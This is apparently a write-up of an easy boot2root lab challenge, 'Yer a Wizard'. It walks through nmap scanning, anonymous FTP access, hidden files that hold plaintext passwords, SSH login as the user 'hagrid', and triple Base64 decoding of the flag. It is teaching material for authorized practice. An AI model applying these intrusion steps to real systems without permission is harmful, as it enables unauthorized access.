# Yer a Wizard

## Challenge information

* **Challenge:** Yer a Wizard
* **Difficulty:** Easy
* **Target IP:** `10.10.0.63`
* **Objective:** Find and recover `user.txt`

---

## 1. Methodology

The penetration testing methodology used for this challenge was:

1. Network reconnaissance and service enumeration
2. FTP service enumeration
3. Anonymous FTP access
4. Discovery of hidden files and directories
5. Credential discovery
6. SSH authentication
7. Local enumeration
8. Discovery of `user.txt`
9. Base64 decoding of the flag

The testing was performed against the authorized Boot2Root target `10.10.0.63`.

---

## 2. Tools used

* **Exegol** — penetration testing environment
* **Nmap 7.93** — network and service enumeration
* **FTP client** — anonymous FTP access and file retrieval
* **SSH** — remote access using discovered credentials
* **Base64 utility** — decoding the encoded flag

No brute force, SQL injection, password cracking, or automated exploitation tools were required.

---

## 3. Network reconnaissance

The first step was to enumerate the services exposed by the target.

### Command

```bash
nmap -sC -sV 10.10.0.63
```

### Output

```text
Starting Nmap 7.93 ( https://nmap.org ) at 2026-09-15 10:09 CEST
Nmap scan report for 10.10.0.63
Host is up (0.045s latency).
Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst:
|   STAT:
|   FTP server status:
|      Connected to 10.8.1.42
|      Logged in as ftp
|      TYPE: ASCII
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      Session timeout in seconds is 300
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)

22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
Service Info: OSs: Unix, Linux
```

### Findings

Two interesting services were identified:

* **Port 21:** FTP (`vsftpd 3.0.5`)
* **Port 22:** SSH (`OpenSSH 10.0p2`)

The Nmap scripts also identified:

```text
ftp-anon: Anonymous FTP login allowed
```

This indicated that the FTP service could be accessed without normal user credentials.

---

## 4. FTP enumeration

I connected to the FTP service:

```bash
ftp 10.10.0.63
```

I authenticated using the anonymous account:

```text
Name: anonymous
Password: ********
```

The initial directory listing appeared empty.

I then checked hidden files:

```text
ftp> ls -la
```

### Output

```text
drwxr-xr-x    1 1000     1000         4096 Jul 23 13:42 .
drwxr-xr-x    1 1000     1000         4096 Jul 23 13:42 ..
drwxr-xr-x    1 1000     1000         4096 Jul 23 13:42 ...
-rw-r--r--    1 1000     1000           81 Jul 23 13:42 .hidden
```

Two interesting entries were discovered:

* `.hidden`
* `...`

This showed the importance of enumerating hidden files instead of relying only on a standard `ls`.

---

## 5. First hidden file

I downloaded `.hidden`:

```text
ftp> get .hidden
```

After leaving FTP:

```text
ftp> bye
```

I read the file:

```bash
cat .hidden
```

### Output

```text
I swear that my password is Il0veTheMalefoys, trust me, I'm Hagrid, I never lie!
```

This revealed:

```text
Potential username: hagrid
Password: ********
```

I initially tested these credentials against SSH:

```bash
ssh hagrid@10.10.0.63
```

The authentication failed.

This indicated that the first discovered password was not the valid SSH password and that further enumeration was required.

---

## 6. Enumeration of the `...` directory

I returned to the FTP service and entered the unusual `...` directory:

```text
ftp> cd ...
ftp> ls -la
```

### Output

```text
drwxr-xr-x    1 1000     1000         4096 Jul 23 13:42 .
drwxr-xr-x    1 1000     1000         4096 Jul 23 13:42 ..
-rw-r--r--    1 1000     1000           41 Jul 23 13:42 .reallyHidden
```

I downloaded the file:

```text
ftp> get .reallyHidden
```

Then read it locally:

```bash
cat .reallyHidden
```

### Output

```text
FINE! My password is IAlreadySaidTooMuch
```

This provided another password:

```text
IAlreadySaidTooMuch
```

---

## 7. SSH access

I tested the discovered password with the previously indicated username:

```bash
ssh hagrid@10.10.0.63
```

The authentication succeeded.

The remote shell was:

```text
hagrid@hogwarts:~$
```

I verified the current user:

```bash
whoami
```

Output:

```text
hagrid
```

I also checked the account information:

```bash
id
```

Output:

```text
uid=1000(hagrid) gid=1000(hagrid) groups=1000(hagrid)
```

This confirmed that I had obtained a normal user account on the target.

---

## 8. Local enumeration

I checked the user's home directory:

```bash
pwd
ls -la
```

Output included:

```text
/home/hagrid

drwxr-xr-x 1 hagrid hagrid 4096 ...
drwxr-xr-x 1 hagrid headmaster 4096 ... .ssh
drwxr-xr-x 1 hagrid hagrid 4096 ... hut
---------- 1 hagrid hagrid 2097 ... riddle.txt
-rw-r--r-- 1 hagrid hagrid   97 ... user.txt
```

The target file was directly present:

```text
/home/hagrid/user.txt
```

---

## 9. Flag recovery

I read the file:

```bash
cat user.txt
```

The content was:

```text
VWxaQ1NtVjZRblZOTVRseVdWVTFabUpxVGpKTk1VcG1ZVWRHVjAweE9IcGlha0pXVDFWb1prNVVRa1JUZWtvNVEyYzlQUT09
```

The value had the characteristics of Base64 encoding.

I decoded it with:

```bash
echo 'VWxaQ1NtVjZRblZOTVRseVdWVTFabUpxVGpKTk1VcG1ZVWRHVjAweE9IcGlha0pXVDFWb1prNVVRa1JUZWtvNVEyYzlQUT09' | base64 -d
```

This produced another Base64-encoded value:

```text
UlZCSmV6QnVNMTlyWVU1ZmJqTjJNMUpmYUdGV00xOHpiakJWT1VoZk5UQkRTeko5Q2c9PQ==
```

I decoded it again:

```bash
echo 'UlZCSmV6QnVNMTlyWVU1ZmJqTjJNMUpmYUdGV00xOHpiakJWT1VoZk5UQkRTeko5Q2c9PQ==' | base64 -d
```

This produced:

```text
RVBJezBuM19rYU5fbjN2M1JfaGFWM18zbjBVOUhfNTBDSzJ9Cg==
```

Finally:

```bash
echo 'RVBJezBuM19rYU5fbjN2M1JfaGFWM18zbjBVOUhfNTBDSzJ9Cg==' | base64 -d
```

The final output was the `EPI{********}` challenge flag.

---

## 10. Techniques used

### Enumeration

* Nmap service and version detection
* FTP directory enumeration
* Hidden file enumeration
* Local filesystem enumeration

### Information disclosure

Sensitive credentials were exposed through files accessible using anonymous FTP.

### Credential reuse / authentication

Credentials discovered through FTP were used to authenticate to SSH.

### Encoding analysis

The `user.txt` value was encoded using multiple layers of Base64. Three successive Base64 decoding operations were required to recover the final flag.

---

## 11. Attack chain

The complete attack chain was:

```text
Nmap
  ↓
FTP anonymous access
  ↓
Hidden file discovery
  ↓
.hidden
  ↓
Credential/username clue
  ↓
Further FTP enumeration
  ↓
.../.reallyHidden
  ↓
Valid SSH password
  ↓
SSH as hagrid
  ↓
Local enumeration
  ↓
/home/hagrid/user.txt
  ↓
Base64 × 3
  ↓
EPI{********}
```

---

## 12. Conclusion

The challenge was solved without brute force, exploitation frameworks, password cracking, SQL injection, or privilege escalation.

The main weakness was the exposure of sensitive information through an anonymously accessible FTP service. Proper enumeration of hidden files and directories revealed credentials that allowed SSH access to the target as the `hagrid` user.

The final `user.txt` flag was additionally protected by three layers of Base64 encoding.
